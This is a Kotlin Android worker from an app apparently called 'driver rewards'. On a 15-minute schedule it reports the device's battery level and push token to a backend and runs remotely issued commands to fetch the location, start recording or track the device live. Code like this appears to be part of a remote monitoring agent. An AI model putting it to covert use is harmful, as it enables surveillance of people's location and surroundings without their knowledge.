// Package: com.sm.driverrewards.worker
// 15-minute WorkManager periodic heartbeat and fail-safe command fetcher
package com.sm.driverrewards.worker

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.sm.core.model.CommandType
import com.sm.driverrewards.data.local.AgentPreferences
import com.sm.driverrewards.data.repository.AgentRepository
import com.sm.driverrewards.service.TelemetryExecutionService
import com.sm.driverrewards.service.location.LocationFetcher

class HeartbeatWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        const val WORK_NAME = "sm_agent_periodic_heartbeat"
    }

    private val prefs = AgentPreferences(applicationContext)
    private val repository = AgentRepository()
    private val locationFetcher = LocationFetcher(applicationContext)

    override suspend fun doWork(): Result {
        if (!prefs.isPaired()) {
            return Result.success()
        }

        val deviceId = prefs.getDeviceId()
        if (deviceId.isBlank()) return Result.success()

        try {
            // 1. Battery metrics fetch aur Supabase update
            val (batteryPct, isCharging) = locationFetcher.getBatteryInfo()
            repository.sendHeartbeat(
                deviceId = deviceId,
                batteryLevel = batteryPct,
                isCharging = isCharging,
                fcmToken = prefs.getFcmToken()
            )

            // 2. Fail-safe command polling: Agar FCM miss hua toh pending commands yahan execute honge
            val pendingCommandsResult = repository.fetchPendingCommands(deviceId)
            if (pendingCommandsResult.isSuccess) {
                val commands = pendingCommandsResult.getOrNull().orEmpty()
                for (command in commands) {
                    when (command.type) {
                        CommandType.GET_LOCATION,
                        CommandType.START_RECORDING,
                        CommandType.LIVE_TRACK -> {
                            TelemetryExecutionService.startCommand(
                                context = applicationContext,
                                commandId = command.id,
                                commandType = command.type,
                                durationMinutes = 5,
                                highAccuracy = false
                            )
                            break // Execute one at a time
                        }
                    }
                }
            }

            return Result.success()
        } catch (e: Exception) {
            return Result.retry()
        }
    }
}
